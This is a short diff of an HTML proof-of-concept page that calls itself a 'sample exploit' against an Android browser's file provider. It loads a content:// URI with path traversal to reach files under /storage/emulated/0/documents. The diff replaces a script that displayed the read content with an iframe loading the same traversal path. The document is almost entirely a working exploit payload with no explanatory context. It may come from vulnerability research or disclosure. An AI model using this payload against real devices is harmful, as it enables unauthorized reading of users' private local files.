@@ -2,11 +2,7 @@
   <h1>Hello this is a sample exploit ! </h1>
   <body>
     <embed id='test' src="content://com.talpa.hibrowser.fileProvider/external_files/../../../../../../../../../storage/emulated/0/documents/test.txt" type="text/plain" />
-    <script>
-      setTimeout(function () {
-        alert(document.getElementById('test').innerHTML)
-    }, 1000);
-    </script>
+    <iframe src="content://com.talpa.hibrowser.fileProvider/external_files/../../../../../../../../../storage/emulated/0/documents/test.txt" type="text/plain"> </iframe>
     </body>
 </html>
 
